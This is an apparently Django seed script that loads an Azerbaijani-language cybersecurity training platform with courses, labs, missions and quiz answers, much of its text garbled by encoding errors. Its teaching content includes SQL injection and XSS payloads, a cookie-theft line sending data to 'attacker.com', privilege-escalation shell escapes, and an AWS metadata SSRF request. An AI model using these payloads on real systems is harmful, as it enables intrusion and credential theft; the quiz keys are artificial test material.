"""
Xakker — tam seed komandasÄ±.

Run:
    python manage.py seed_all            # idempotent
    python manage.py seed_all --reset    # Ã¶ncÉ™ mÉ™lumatlarÄ± silir
    python manage.py seed_all --demo-users

ModeI qovlama:
    Category, Course, Lesson, Question (self-study), QuestionChoice
    RoomTag, Room, Task, TaskQuestion, TaskQuestionChoice
    Mission, MissionPass, MissionExam, MissionExamQuestion, MissionExamChoice
    LearningPlan, LearningPlanCourse
"""
from django.contrib.auth.models import User
from django.core.management.base import BaseCommand
from django.db import transaction
from django.utils.text import slugify

from accounts.models import Activity, UserProfile
from courses.models import (
    Category,
    Course,
    Enrollment,
    LearningPlan,
    LearningPlanCourse,
    Lesson,
    Mission,
    MissionDifficultyChoices,
    MissionExam,
    MissionExamChoice,
    MissionExamQuestion,
    MissionPass,
    Question,
    QuestionChoice,
    QuestionTypeChoices,
    Room,
    RoomTag,
    Task,
    TaskAnswerKind,
    TaskQuestion,
    TaskQuestionChoice,
)

# ═══════════════════════════════════════════════════════════════
#  STATIC DATA
# ═══════════════════════════════════════════════════════════════

CATEGORIES = [
    {"name": "Web TÉ™hlÃ¼kÉ™sizliyi", "slug": "web", "icon": "ðŸ•¸ï¸", "color": "#3b82f6",
     "description": "Web tÉ™tbiqlÉ™rindÉ™ zÉ™ifliklÉ™rin aÅŸkarlanmasÄ± vÉ™ istismarÄ±."},
    {"name": "ShÉ™bÉ™kÉ™ TÉ™hlÃ¼kÉ™sizliyi", "slug": "network", "icon": "ðŸŒ", "color": "#14b8a6",
     "description": "TCP/IP, firewall, IDS/IPS, protocol analizi."},
    {"name": "Sistem TÉ™hlÃ¼kÉ™sizliyi", "slug": "system", "icon": "ðŸ§°", "color": "#8b5cf6",
     "description": "Linux/Windows mÃ¼hitindÉ™ privesc vÉ™ post-exploit."},
    {"name": "KriptoqrafiyA", "slug": "crypto", "icon": "ðŸ"", "color": "#22c55e",
     "description": "ÅžifrÉ™lÉ™mÉ™, hash, sertifikatlar vÉ™ kriptoanaliz."},
    {"name": "OSINT vÉ™ Kəşfiyyat", "slug": "osint", "icon": "ðŸ"Ž", "color": "#f59e0b",
     "description": "AÃ§Äq mÉ™lumat kÉ™Å Fiyyatı vÉ™ passiv recon."},
    {"name": "Offensive Security", "slug": "offensive", "icon": "âš"ï¸", "color": "#ff3b3b",
     "description": "Red team, pentesting vÉ™ adversary simulation."},
]

TAGS = [
    "linux", "windows", "recon", "enumeration", "exploit", "privesc",
    "burp", "sqli", "xss", "ssrf", "lfi", "csrf",
    "nmap", "wireshark", "osint", "dfir", "crypto",
    "cloud", "docker", "active-directory", "reverse",
    "forensics", "malware", "network", "web",
]

# ─── Kurs məlumatları ────────────────────────────────────────────

COURSES_DATA = [
    {
        "slug": "web-security-fundamentals",
        "title": "Web TÉ™hlÃ¼kÉ™sizliyi Əsasları",
        "category": "web",
        "icon": "ðŸ•¸ï¸",
        "description": "HTTP, HTML, JavaScript, DOM vÉ™ web zÉ™ifliklÉ™rinin Ã¼mumi mÉ™nzÉ™rÉ™si.",
        "lessons": [
            {"title": "HTTP Protokolu", "order": 1, "content": "HTTP sorÄŸu/cavab sikli, metodlar (GET/POST/PUT/DELETE), status kodlar vÉ™ headerlar.\n\n## MÉ™qamlÄ±\n- `200 OK` — UÄŸurlu\n- `301/302` — YönlÉ™ndirmÉ™\n- `403 Forbidden` — ÄcazÉ™ yoxdur\n- `500` — Server xÉ™tası"},
            {"title": "SQL Injection", "order": 2, "content": "SQL injection zÉ™ifliyi input sanitizasiyasının Ã¼stÃ¼nlÃ¼yÃ¼ndÉ™n istifadÉ™ edir.\n\n```sql\n' OR 1=1 --\nadmin' --\n```"},
            {"title": "XSS — Cross Site Scripting", "order": 3, "content": "Stored, Reflected vÉ™ DOM-based XSS növlÉ™ri. Cookie oÄŸurlanması."},
            {"title": "CSRF Hücumları", "order": 4, "content": "Cross-Site Request Forgery — istifadÉ™Ã§i adından arzuolunmaz sorÄŸular göndÉ™rmÉ™k."},
        ],
        "questions": [
            {"title": "XSS növləri", "type": "closed", "level": "beginner", "points": 25,
             "prompt": "AÅŸaÄŸÄ±dakÄ±lardan hansÄ± XSS növÃ¼ DEYİL?",
             "choices": [("Reflected XSS", False), ("Stored XSS", False), ("DOM-based XSS", False), ("SQL XSS", True)]},
            {"title": "OWASP Top 10", "type": "closed", "level": "intermediate", "points": 30,
             "prompt": "OWASP Top 10-da SQLi hansÄ± kategoriyaya aiddir (2021)?",
             "choices": [("A01: Broken Access Control", False), ("A03: Injection", True), ("A05: Security Misconfiguration", False), ("A07: Auth Failures", False)]},
            {"title": "HTTP metodları", "type": "closed", "level": "beginner", "points": 20,
             "prompt": "Serverdə məlumat göndərmək üçün hansı HTTP metodu istifadÉ™ edilir?",
             "choices": [("GET", False), ("POST", True), ("DELETE", False), ("HEAD", False)]},
            {"title": "SQL Injection izahı", "type": "open", "level": "beginner", "points": 30,
             "prompt": "SQL Injection zÉ™ifliyini qısaca izah edin vÉ™ onun qarÅŸısını almaq Ã¼Ã§Ã¼n 2 Ã¼sul yazın."},
            {"title": "CSRF token", "type": "open", "level": "intermediate", "points": 35,
             "prompt": "CSRF token nÉ™dir vÉ™ necÉ™ qorunma tÉ™min edir? Addımlarla izah edin."},
            {"title": "Port skanlama", "type": "terminal", "level": "beginner", "points": 50,
             "prompt": "HÉ™dÉ™f serverdÉ™ aÃ§Äq portları tapın vÉ™ HTTP xidmÉ™tini aşkarlayın.",
             "starter_code": "nmap -sV 10.10.10.1"},
            {"title": "Directory brute-force", "type": "terminal", "level": "intermediate", "points": 60,
             "prompt": "Gobuster ilÉ™ hÉ™dÉ™f veb serverdÉ™ gizli direktoriyaları tapın.",
             "starter_code": "gobuster dir -u http://target.local"},
        ],
    },
    {
        "slug": "network-security-101",
        "title": "ShÉ™bÉ™kÉ™ TÉ™hlÃ¼kÉ™sizliyi 101",
        "category": "network",
        "icon": "ðŸŒ",
        "description": "TCP/IP, subnets, routing, firewall vÉ™ network protokollarının tÉ™hlÃ¼kÉ™sizlik aspektlÉ™ri.",
        "lessons": [
            {"title": "TCP/IP Modeli", "order": 1, "content": "7 qatlı OSI modeli vÉ™ 4 qatlı TCP/IP modeli. HÉ™r qatın tÉ™hlÃ¼kÉ™sizlik Ã¼zrÉ™ rolu."},
            {"title": "Port Nömrəlri vÉ™ Protokollar", "order": 2, "content": "Ã‡ox istifadÉ™ olunan portlar: 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL), 21(FTP)."},
            {"title": "Firewall vÉ™ IDS/IPS", "order": 3, "content": "Stateful/stateless firewall fÉ™rqi. IDS vs IPS. Snort vÉ™ Suricata."},
        ],
        "questions": [
            {"title": "HTTP portu", "type": "closed", "level": "beginner", "points": 20,
             "prompt": "HTTP xidmÉ™ti standart olaraq hansı portda işləyir?",
             "choices": [("21", False), ("22", False), ("80", True), ("443", False)]},
            {"title": "SSH portu", "type": "closed", "level": "beginner", "points": 20,
             "prompt": "SSH protokolu standart olaraq hansı portu istifadÉ™ edir?",
             "choices": [("21", False), ("22", True), ("23", False), ("25", False)]},
            {"title": "Nmap port scan", "type": "terminal", "level": "beginner", "points": 40,
             "prompt": "Hədəf hostda bütün açıq portları vÉ™ servis versiyalarını tapın.",
             "starter_code": "nmap -sV 10.10.11.1"},
            {"title": "Firewall fərqi", "type": "open", "level": "intermediate", "points": 35,
             "prompt": "Stateful vÉ™ stateless firewall arasındakı Éˆsas fÉ™rqi izah edin. HansÄ±nÄ± nÉ™ vaxt seÃ§mÉ™li?"},
        ],
    },
    {
        "slug": "linux-privilege-escalation",
        "title": "Linux Privilege Escalation",
        "category": "system",
        "icon": "ðŸ§°",
        "description": "SUID, cron job, kernel exploit vÉ™ sudo misconfig ilÉ™ root almaq.",
        "lessons": [
            {"title": "SUID Binary-lar", "order": 1, "content": "SUID bit nÉ™dir? `find / -perm -4000` ilÉ™ tapılan faylları necÉ™ istifadÉ™ etmÉ™li."},
            {"title": "Sudo Misconfigurations", "order": 2, "content": "`sudo -l` ilÉ™ icazÉ™lÉ™ri yoxla. GTFOBins-dÉ™n privesc vektorları tap."},
            {"title": "Cron Job Exploitation", "order": 3, "content": "`crontab -l` vÉ™ `/etc/cron*` qovluqları. Yazıla bilÉ™n script ilÉ™ code injection."},
        ],
        "questions": [
            {"title": "SUID tapma", "type": "terminal", "level": "intermediate", "points": 55,
             "prompt": "SistemdÉ™ SUID bit ilÉ™ iÅŸlÉ™yÉ™n bütün binary-ları tapın.",
             "starter_code": "find / -perm -4000 -type f 2>/dev/null"},
            {"title": "Sudo icazÉ™lÉ™ri", "type": "terminal", "level": "beginner", "points": 35,
             "prompt": "CÉ™ri istifadÉ™Ã§inin hansÄ± sudo icazÉ™lÉ™ri olduÄŸunu tapın.",
             "starter_code": "sudo -l"},
            {"title": "Privesc üsulları", "type": "open", "level": "advanced", "points": 50,
             "prompt": "Linux-da privilege escalation Ã¼Ã§Ã¼n Én azı 4 Ã¼sul sadalayın vÉ™ hÉ™r birini qısaca izah edin."},
        ],
    },
    {
        "slug": "cryptography-basics",
        "title": "KriptoqrafiyA Əsasları",
        "category": "crypto",
        "icon": "ðŸ"",
        "description": "AES, RSA, hash funksiyaları, sertifikatlar vÉ™ kriptoanalizÉ™ giriÅŸ.",
        "lessons": [
            {"title": "Simmetrik ÅžifrÉ™lÉ™mÉ™", "order": 1, "content": "AES, DES, 3DES. Block vs stream cipher. CBC, GCM rejimlÉ™ri."},
            {"title": "Asimmetrik ÅžifrÉ™lÉ™mÉ™", "order": 2, "content": "RSA, ECDSA. Public/private açar cütü. Rəqəmsal imza."},
            {"title": "Hash Funksiyaları", "order": 3, "content": "MD5, SHA1, SHA256, bcrypt. Rainbow table vÉ™ salt. Password hashing."},
        ],
        "questions": [
            {"title": "Asimmetrik alqoritm", "type": "closed", "level": "intermediate", "points": 35,
             "prompt": "AÅŸaÄŸÄ±dakÄ±lardan hansÄ± asimmetrik ÅŸifrÉ™lÉ™mÉ™ alqoritmidir?",
             "choices": [("AES", False), ("DES", False), ("RSA", True), ("Blowfish", False)]},
            {"title": "Base64 decode", "type": "terminal", "level": "beginner", "points": 40,
             "prompt": "AÅŸaÄŸÄ±dakÄ± Base64 mÉ™tnini deÅŸifrÉ™ edin: eGtyezEybWVuNHRpb259",
             "starter_code": "echo 'eGtyezEybWVuNHRpb259' | base64 -d"},
            {"title": "Hash növü", "type": "closed", "level": "beginner", "points": 25,
             "prompt": "Password hashing üçün hansı alqoritm tövsiyÉ™ edilir?",
             "choices": [("MD5", False), ("SHA1", False), ("bcrypt", True), ("SHA256", False)]},
            {"title": "Salt nÉ™dir?", "type": "open", "level": "beginner", "points": 30,
             "prompt": "KriptoqrafiyA kontekstindÉ™ 'salt' nÉ™dir? Rainbow table hücumunun qarÅŸısını necÉ™ alır?"},
        ],
    },
    {
        "slug": "osint-techniques",
        "title": "OSINT KÉ™ÅŸfiyyat Texnikaları",
        "category": "osint",
        "icon": "ðŸ"Ž",
        "description": "Açıq mÉ™nba kÉ™ÅŸfiyyatı: whois, DNS, crt.sh, Google dorks vÉ™ Shodan.",
        "lessons": [
            {"title": "DNS vÉ™ Whois", "order": 1, "content": "`whois`, `dig`, `nslookup` ilÉ™ domain mÉ™lumatlarını toplamaq."},
            {"title": "Certificate Transparency", "order": 2, "content": "crt.sh ilÉ™ subdomain discovery. SSL sertifikat tarixÃ§Éˆsi."},
            {"title": "Google Dorks", "order": 3, "content": "site:, filetype:, inurl:, intitle: ilÉ™ hÉ™dÉ™f haqqında mÉ™lumat toplamaq."},
        ],
        "questions": [
            {"title": "WHOIS sorÄŸusu", "type": "terminal", "level": "beginner", "points": 30,
             "prompt": "example.az domen haqqında qeydiyyat mÉ™lumatlarını öyrÉ™nin.",
             "starter_code": "whoami"},
            {"title": "Google Dork", "type": "open", "level": "beginner", "points": 25,
             "prompt": "site:example.az filetype:pdf Google dork-u nÉ™ edir? Ã‡Ätınlığı vÉ™ Ã¼stÃ¼nlÃ¼yÃ¼ nÉ™dir?"},
            {"title": "Subdomain kÉ™ÅŸfi", "type": "closed", "level": "intermediate", "points": 30,
             "prompt": "Certificate transparency loglarından subdomain tapmaq üçün hansı xidmÉ™t istifadÉ™ edilir?",
             "choices": [("Shodan", False), ("crt.sh", True), ("VirusTotal", False), ("Censys", False)]},
        ],
    },
    {
        "slug": "advanced-pentesting",
        "title": "Advanced Pentesting",
        "category": "offensive",
        "icon": "âš"ï¸",
        "description": "Web vÉ™ network üzrÉ™ irÉ™lÉ™lmiÅŸ pentest texnikaları.",
        "lessons": [
            {"title": "SSRF Exploitasiyası", "order": 1, "content": "Server-Side Request Forgery — server vasitÉ™silÉ™ daxili resurslara mÃ¼raciÉ™t."},
            {"title": "XXE Injection", "order": 2, "content": "XML External Entity injection ilÉ™ faylları oxumaq vÉ™ SSRF."},
            {"title": "Deserialization", "order": 3, "content": "Insecure deserialization ilÉ™ RCE. Java, PHP, Python gadget chains."},
        ],
        "questions": [
            {"title": "SSRF hÉ™dÉ™fi", "type": "closed", "level": "advanced", "points": 45,
             "prompt": "SSRF hücumunun Éˆsas hÉ™dÉ™fi nÉ™dir?",
             "choices": [("Client brauzeri hÉ™dÉ™f almaq", False), ("Serveri daxili resurslara sorÄŸu göndÉ™rmÉ™yÉ™ mÉ™cburetmÉ™k", True), ("SQLi etmÉ™k", False), ("XSS payload yeritmÉ™k", False)]},
            {"title": "Curl ilÉ™ SSRF testi", "type": "terminal", "level": "advanced", "points": 70,
             "prompt": "HÉ™dÉ™f serverin daxili metadata servisindÉ™n AWS kreditlÉ™rini Éˆldə etmÉ™yÉ™ çalışın.",
             "starter_code": "curl http://169.254.169.254/latest/meta-data/"},
            {"title": "XXE izahı", "type": "open", "level": "advanced", "points": 50,
             "prompt": "XML External Entity (XXE) injection nÉ™dir? HansÄ± hallarda baÅŸ verir vÉ™ necÉ™ qarşısını almaq olar?"},
        ],
    },
]

# ─── Lab (Room) məlumatları ─────────────────────────────────────

ROOMS_DATA = [
    # Web track rooms
    {
        "course_slug": "web-security-fundamentals",
        "title": "SQL Injection Lab",
        "summary": "DVWA benzÉ™ri mÃ¼hitdÉ™ SQL injection texnikalarını öyrÉ™n.",
        "level": "intermediate", "minutes": 60, "points": 300,
        "icon": "ðŸ'‰", "color": "#3b82f6", "env": "docker",
        "tags": ["sqli", "web", "burp"],
        "tasks": [
            {
                "title": "Login bypass",
                "content": "# SQL Injection ilÉ™ Login Bypass\n\nLogin formu bu sorÄŸunu icra edir:\n```sql\nSELECT * FROM users WHERE username='$u' AND password='$p';\n```\n\nPayload: `admin' --`",
                "points": 40,
                "questions": [
                    {"prompt": "Login bypass üçün ən sadÉ™ payload?", "kind": "text", "answer": "admin' --"},
                    {"prompt": "SQL-da comment başlatmaq üçün hansı simvol?", "kind": "text", "answer": "--"},
                ],
            },
            {
                "title": "UNION-based data extraction",
                "content": "# UNION SELECT ilÉ™ MÉ™lumat Çıxarma\n\nColumn sayını müÉˆyyÉ™n et vÉ™ users cÉ™dvÉ™lini oxu.\n```sql\n' UNION SELECT 1,username,password FROM users --\n```",
                "points": 50,
                "questions": [
                    {"prompt": "Column sayını müÉˆyyÉ™n etmÉ™k üçün hansı SQL açar sözü?", "kind": "text", "answer": "ORDER BY"},
                    {"prompt": "UNION SELECT neçÉ™ sÃ¼tun qaytarmalıdır (orijinal ilÉ™ müqayisÉ™dÉ™)?", "kind": "choice", "points": 15,
                     "choices": [("Daha az", False), ("BÉ™rabÉ™r sayda", True), ("İstənilÉ™n sayda", False), ("Bir artıq", False)]},
                ],
            },
        ],
    },
    {
        "course_slug": "web-security-fundamentals",
        "title": "XSS Arena",
        "summary": "Reflected, Stored vÉ™ DOM XSS vektorlarını praktik araÅŸdır.",
        "level": "intermediate", "minutes": 50, "points": 250,
        "icon": "âš¡", "color": "#f59e0b", "env": "docker",
        "tags": ["xss", "web", "burp"],
        "tasks": [
            {
                "title": "Reflected XSS tapma",
                "content": "# Reflected XSS\n\nSearch parametri HTML-É™ birbaÅŸa yazılırsa:\n```\n<script>alert(document.cookie)</script>\n```",
                "points": 35,
                "questions": [
                    {"prompt": "Cookie oÄŸurlamaq üçün XSS payload-ı nÉ™dÉ™n istifadÉ™ edir?", "kind": "text", "answer": "document.cookie"},
                ],
            },
            {
                "title": "Stored XSS exploitation",
                "content": "# Stored XSS\n\nComment sahÉ™sinÉ™ payload yeritmÉ™k. HÉ™r ziyarÉ™tÃ§i tÉ™tÉ™iklÉ™yÉ™r.",
                "points": 40,
                "questions": [
                    {"prompt": "Stored vÉ™ Reflected XSS arasındakı Éˆsas fÉ™rq?", "kind": "choice", "points": 15,
                     "choices": [("Heç bir fÉ™rq yoxdur", False), ("Stored server-dÉ™ saxlanılır, daimi tÉ™hlÃ¼kÉ™dir", True), ("Reflected daha tÉ™hlÃ¼kÉ™lidir", False), ("DOM-based daha sadÉ™dir", False)]},
                ],
            },
        ],
    },
    # Network rooms
    {
        "course_slug": "network-security-101",
        "title": "Corp Network Lab",
        "summary": "Korporativ ÅŸÉ™bÉ™kÉ™dÉ™ reconnaissance vÉ™ lateral movement.",
        "level": "intermediate", "minutes": 90, "points": 400,
        "icon": "ðŸ"Œ", "color": "#14b8a6", "env": "vpn",
        "tags": ["network", "nmap", "enumeration"],
        "tasks": [
            {
                "title": "ShÉ™bÉ™kÉ™ kÉ™ÅŸfi",
                "content": "# ShÉ™bÉ™kÉ™ Haritalaması\n\nNmap ilÉ™ bütün aktiv hostları tap:\n```bash\nnmap -sn 10.10.10.0/24\n```",
                "points": 50,
                "questions": [
                    {"prompt": "Subnet üzrÉ™ host discovery üçün nmap bayrağı?", "kind": "text", "answer": "-sn"},
                    {"prompt": "10.10.10.0/24 subnet-dÉ™ neçÉ™ host mümkündür?", "kind": "numeric", "answer": "254"},
                ],
            },
            {
                "title": "Service enumeration",
                "content": "# ServisVersion Detection\n\nHÉ™r hostda iÅŸlÉ™yÉ™n servislÉ™ri müÉˆyyÉ™n et:\n```bash\nnmap -sV -p- 10.10.10.5\n```",
                "points": 50,
                "questions": [
                    {"prompt": "SMB protokolu hansı portda işləyir?", "kind": "numeric", "answer": "445"},
                ],
            },
        ],
    },
    # System rooms
    {
        "course_slug": "linux-privilege-escalation",
        "title": "Linux Privesc Lab",
        "summary": "SUID, sudo vÉ™ cron job üzÉ™rindÉ™ privilege escalation.",
        "level": "advanced", "minutes": 80, "points": 500,
        "icon": "ðŸ§°", "color": "#8b5cf6", "env": "linux",
        "tags": ["privesc", "linux", "exploit"],
        "tasks": [
            {
                "title": "SUID Exploitation",
                "content": "# SUID Binary Exploitation\n\nSUID bit olan faylları tap vÉ™ GTFOBins-É™ bax.\n```bash\nfind / -perm -u=s -type f 2>/dev/null\n```",
                "points": 60,
                "questions": [
                    {"prompt": "SUID bit olan `find` binary-si ilÉ™ shell almaq üçün komanda?", "kind": "text", "answer": "find . -exec /bin/bash -p \\;"},
                ],
            },
        ],
    },
    {
        "course_slug": "linux-privilege-escalation",
        "title": "Windows Privesc Lab",
        "summary": "Token manipulation, service hijacking vÉ™ registry-based privesc.",
        "level": "advanced", "minutes": 100, "points": 600,
        "icon": "ðŸª", "color": "#6b7280", "env": "windows",
        "tags": ["privesc", "windows", "active-directory"],
        "tasks": [
            {
                "title": "Token manipulation",
                "content": "# Windows Token Manipulation\n\nWhoami /priv ilÉ™ mövcud tokenlÉ™ri yoxla.\n`SeImpersonatePrivilege` — PotatoLPE exploitlÉ™ri üçün Éˆsas.",
                "points": 70,
                "questions": [
                    {"prompt": "SeImpersonatePrivilege tokenini istismar etmÉ™k üçün aşağıdakılardan hansı exploit ailəsindÉ™n istifadÉ™ edilir?", "kind": "choice", "points": 20,
                     "choices": [("Potato exploits", True), ("Buffer overflow", False), ("Kernel panic", False), ("SUID bypass", False)]},
                ],
            },
        ],
    },
    # Crypto room
    {
        "course_slug": "cryptography-basics",
        "title": "Crypto Vault",
        "summary": "ÅžifrÉ™lÉ™mÉ™ bypass, hash kracking vÉ™ açar çıxarma.",
        "level": "advanced", "minutes": 75, "points": 450,
        "icon": "ðŸ"", "color": "#22c55e", "env": "docker",
        "tags": ["crypto", "reverse"],
        "tasks": [
            {
                "title": "Hash Cracking",
                "content": "# Hash Cracking\n\nHashcat ilÉ™ MD5 hash-i krak et:\n```bash\nhashcat -m 0 -a 0 hash.txt rockyou.txt\n```",
                "points": 50,
                "questions": [
                    {"prompt": "MD5 hashcat module ID?", "kind": "numeric", "answer": "0"},
                    {"prompt": "Rockyou.txt nÉ™dir?", "kind": "choice", "points": 15,
                     "choices": [("Bir hash aləti", False), ("Wordlist — parol siyahısı", True), ("Exploit framework", False), ("VPN konfiqurasiyası", False)]},
                ],
            },
        ],
    },
    # OSINT room
    {
        "course_slug": "osint-techniques",
        "title": "OSINT Deep Dive",
        "summary": "Real hÉ™dÉ™f haqqında tam mÉ™lumat profili qurmaq.",
        "level": "beginner", "minutes": 60, "points": 200,
        "icon": "ðŸ'ï¸", "color": "#f59e0b", "env": "browser",
        "tags": ["osint", "recon"],
        "tasks": [
            {
                "title": "Domain recon",
                "content": "# Domain KÉ™ÅŸfi\n\ncrt.sh, VirusTotal vÉ™ Shodan ilÉ™ tam subdomain xÉ™ritÉ™si Ã§Äxar.",
                "points": 40,
                "questions": [
                    {"prompt": "Shodan-da hansı filter aktiv veb serverlÉ™ri tapır?", "kind": "text", "answer": "port:80"},
                ],
            },
        ],
    },
]

# ─── Mission məlumatları ────────────────────────────────────────

MISSIONS_DATA = [
    {
        "slug": "sql-injection-101",
        "title": "SQL Injection 101",
        "difficulty": "easy",
        "icon": "ðŸ'‰",
        "color": "#3b82f6",
        "xp": 500,
        "hours": 2,
        "short_desc": "Manual vÉ™ avtomatik SQL injection texnikalarını mÉ™nimsÉ™.",
        "desc": "Bu missiyada siz SQL injection zÉ™ifliklÉ™rinin nÉ™ olduÄŸunu öyrÉ™nÉ™cÉ™k, in-band, blind vÉ™ time-based SQLi tiplÉ™rini araÅŸdıracaq, Burp Suite ilÉ™ praktik test edÉ™cÉ™ksiniz.",
        "passes": [
            {"title": "SQL Injection Nədir?", "order": 1, "minutes": 15,
             "content": "<h2>SQL Injection nÉ™dir?</h2><p>SQL injection, istifadÉ™Ã§i giriÅŸinin düzgün filtrlÉ™nmÉ™diyi hallarda bÉ™dniiyyÉ™tli SQL kodunun verilÉ™n bazasına yeridilib icra edilmÉ™sidir.</p><pre><code>SELECT * FROM users WHERE username='admin' AND password='admin'--';</code></pre>"},
            {"title": "Union-based SQLi", "order": 2, "minutes": 20,
             "content": "<h2>UNION-based SQLi</h2><p>UNION açar sözü ilÉ™ Éˆlavɛ cÉ™dvÉ™ldÉ™n mÉ™lumat çıxarmaq mümkündür.</p><pre><code>' UNION SELECT 1, username, password FROM users --</code></pre>"},
            {"title": "Blind SQLi vÉ™ sqlmap", "order": 3, "minutes": 25,
             "content": "<h2>Blind SQL Injection</h2><p>CavabÄ±n birbaÅŸa görünmÉ™diyi hallarda Boolean vÉ™ ya time-based üsullar istifadÉ™ edilir.</p><pre><code>sqlmap -u 'http://target.com/page?id=1' --dbs</code></pre>"},
        ],
        "exam": {
            "title": "SQLi Yekun Sınaq", "passing": 70, "time": 20, "max_attempts": 3, "xp": 100,
            "questions": [
                {"text": "SQL injection ilÉ™ login bypass üçün istifadÉ™ olunan klassik payload?", "type": "closed", "order": 1,
                 "choices": [("' OR 1=1 --", True), ("<script>alert(1)</script>", False), ("../../../etc/passwd", False), ("${7*7}", False)]},
                {"text": "In-band SQLi ilÉ™ sütun sayını müÉˆyyÉ™n etmÉ™k üçün hansı SQL açar sözünü istifadÉ™ edirik?", "type": "closed", "order": 2,
                 "choices": [("GROUP BY", False), ("ORDER BY", True), ("HAVING", False), ("LIMIT", False)]},
            ],
        },
    },
    {
        "slug": "xss-mastery",
        "title": "XSS Mastery",
        "difficulty": "medium",
        "icon": "âš¡",
        "color": "#f59e0b",
        "xp": 750,
        "hours": 3,
        "short_desc": "Reflected, Stored vÉ™ DOM-based XSS texnikalarını mÉ™nimsÉ™.",
        "desc": "XSS (Cross-Site Scripting) müasir veb tÉ™tbiqlÉ™rinin Én çox rast gÉ™linÉ™n zÉ™ifliklÉ™rindÉ™n biridir. Bu missiyada bütün XSS növlÉ™rini öyrÉ™nÉ™cÉ™ksiniz.",
        "passes": [
            {"title": "XSS NövlÉ™ri", "order": 1, "minutes": 15,
             "content": "<h2>XSS NövlÉ™ri</h2><ul><li><strong>Reflected XSS</strong>: Server cavabında birbaÅŸa Éˆks olunur</li><li><strong>Stored XSS</strong>: VÉ™rilÉ™n bazasında saxlanılır</li><li><strong>DOM-based XSS</strong>: Client tÉ™rÉ™fdÉ™ baÅŸ verir</li></ul>"},
            {"title": "Cookie Theft vÉ™ Session Hijack", "order": 2, "minutes": 20,
             "content": "<h2>Cookie Theft</h2><p>XSS ilÉ™ cookie oÄŸurlama:</p><pre><code>document.location='http://attacker.com/?c='+document.cookie</code></pre>"},
        ],
        "exam": {
            "title": "XSS Yekun Sınaq", "passing": 70, "time": 15, "max_attempts": 3, "xp": 75,
            "questions": [
                {"text": "Stored XSS reflecteddan nÉ™ylÉ™ fÉ™rqlÉ™nir?", "type": "closed", "order": 1,
                 "choices": [("HeÃ§ bir fÉ™rq yoxdur", False), ("Server tÉ™rÉ™fdÉ™ saxlanılır, daimi tÉ™hlÃ¼kÉ™dir", True), ("Yalnız admin görÉ™ bilÉ™r", False), ("DOM-da işləyir", False)]},
            ],
        },
    },
    {
        "slug": "network-pentest-basics",
        "title": "Network Pentest Əsasları",
        "difficulty": "easy",
        "icon": "ðŸ"Œ",
        "color": "#14b8a6",
        "xp": 400,
        "hours": 2,
        "short_desc": "Port scanning, service enumeration vÉ™ aktiv recon.",
        "desc": "Network pentestinin Éˆsasları: nmap ilÉ™ ÅŸÉ™bÉ™kÉ™ kÉ™ÅŸfi, servis versiya aşkarlama vÉ™ ilk recon addımları.",
        "passes": [
            {"title": "Nmap ilÉ™ Port Scanning", "order": 1, "minutes": 20,
             "content": "<h2>Nmap</h2><p>Nmap dünyanın Én çox istifadÉ™ olunan port scanner-idir.</p><pre><code>nmap -sV -sC -p- target.lab</code></pre><p>-sV: servis versiyası, -sC: default script-lÉ™r, -p-: bütün portlar</p>"},
            {"title": "Service Enumeration", "order": 2, "minutes": 20,
             "content": "<h2>ServisEnumeration</h2><p>AÃ§Äq portlardakı servislÉ™ri dÉ™rinlÉ™mÉ™sinÉ™ araÅŸdır: banner grabbing, NSE script-lÉ™ri.</p>"},
        ],
        "exam": None,
    },
    {
        "slug": "linux-privilege-escalation-mission",
        "title": "Linux Privilege Escalation",
        "difficulty": "hard",
        "icon": "ðŸ§°",
        "color": "#8b5cf6",
        "xp": 1200,
        "hours": 4,
        "short_desc": "SUID, cron vÉ™ kernel exploit ilÉ™ root almaq.",
        "desc": "Linux mÃ¼hitindÉ™ privilege escalation texnikalarının Ã¼mumi baxışı. SUID binary-lar, sudo misconfig, cron job-lar vÉ™ kernel exploitlÉ™ri ÉˆhatÉ™ olunur.",
        "passes": [
            {"title": "SUID Binary Exploitation", "order": 1, "minutes": 25,
             "content": "<h2>SUID Binary-lar</h2><p>SUID bit ilÉ™ iÅŸlÉ™yÉ™n binary-lar root sÉ™lahiyyÉ™ti ilÉ™ icra edilir.</p><pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre><p>GTFOBins-É™ baxaraq hÉ™r binary üçün exploit Ã§Äxar.</p>"},
            {"title": "Sudo Misconfigurations", "order": 2, "minutes": 20,
             "content": "<h2>Sudo İcazÉ™lÉ™ri</h2><pre><code>sudo -l\n(ALL) NOPASSWD: /usr/bin/vim</code></pre><p>vim ilÉ™ shell: <code>:!/bin/bash</code></p>"},
            {"title": "Cron Job Exploitation", "order": 3, "minutes": 25,
             "content": "<h2>Cron Job Exploitation</h2><p>Root cron job-ı yazıla bilÉ™n script-i iÅŸlÉ™dirsÉ™, o script-É™ reverse shell Éˆlavɛ et.</p>"},
        ],
        "exam": {
            "title": "Linux Privesc Sınaq", "passing": 75, "time": 25, "max_attempts": 3, "xp": 200,
            "questions": [
                {"text": "SUID binary-ları tapmaq üçün hansı find komandasından istifadÉ™ edilir?", "type": "closed", "order": 1,
                 "choices": [("find / -suid", False), ("find / -perm -4000 -type f", True), ("find / -u=s", False), ("ls -la /bin", False)]},
                {"text": "`sudo -l` komandasının mÉ™qsÉ™di nÉ™dir?", "type": "closed", "order": 2,
                 "choices": [("Root olaraq login olmaq", False), ("MÉ™vcud sudo icazÉ™lÉ™rini siyahılamaq", True), ("Parolu sıfırlamaq", False), ("Bütün iÅŸlÉ™yÉ™n servislÉ™ri göstÉ™rmÉ™k", False)]},
            ],
        },
    },
    {
        "slug": "crypto-ctf",
        "title": "KriptoqrafiyA CTF",
        "difficulty": "medium",
        "icon": "ðŸ"",
        "color": "#22c55e",
        "xp": 600,
        "hours": 2,
        "short_desc": "Base64, XOR, Caesar cipher vÉ™ müasir kriptoqrafiya challenge-lÉ™ri.",
        "desc": "CTF üslubunda kriptoqrafiya tapşırıqları: şifrələnmiş mÉ™tnlÉ™ri deÅŸifrÉ™ etmÉ™k, hash-lÉ™ri krak etmÉ™k vÉ™ açar mÉ™ntiqi tapmaq.",
        "passes": [
            {"title": "Klassik ÅžifrÉ™lÉ™r", "order": 1, "minutes": 20,
             "content": "<h2>Klassik ÅžifrÉ™lÉ™r</h2><p>Caesar, ROT13, Vigenere. CyberChef ilÉ™ sınaqdan keÃ§ir.</p>"},
            {"title": "Base64 vÉ™ Hex Encoding", "order": 2, "minutes": 15,
